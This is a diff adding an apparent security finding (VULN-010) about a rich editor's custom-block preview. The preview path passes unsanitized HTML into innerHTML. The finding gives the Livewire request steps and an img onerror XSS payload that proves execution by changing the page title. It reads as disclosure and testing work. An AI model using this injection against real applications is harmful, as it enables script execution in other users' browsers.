@@ -1,0 +1,18 @@
+### VULN-010 — the custom-block insert flow. Full capture in response.txt / browser.log.
+### The editor-PREVIEW path base64's toPreviewHtml(config) with NO Str::sanitizeHtml (the reader
+### path DOES sanitize), and the client injects it via innerHTML.
+
+### 1) Mount the custom-block insert action (richEditorCustomBlocks editor)
+POST /livewire/update  (calls: mountAction "customBlock"
+  {"id":"rawhtml","mode":"insert","editorSelection":{"type":"node","anchor":0,"head":0}}
+  context {"schemaComponent":"form.richEditorCustomBlocks"})
+
+### 2) Set the block config body to a payload and submit
+POST /livewire/update  (updates {"mountedActions.0.data.body":
+    "<img src=x onerror=\"document.title='PWNED-<suffix>'\">"}; calls: callMountedAction)
+### Server response dispatches run-rich-editor-commands carrying
+###   base64("<img src=x onerror=...>")  — i.e. the RAW, unsanitized payload.
+### Reader path for the same HTML: Str::sanitizeHtml(...) => <img src="x" />  (onerror stripped).
+
+### 3) Client (extension-custom-block.js:132): preview.innerHTML = atob(node.attrs.preview)
+###   → the onerror fires → document.title becomes "PWNED-<suffix>" (proof of execution).
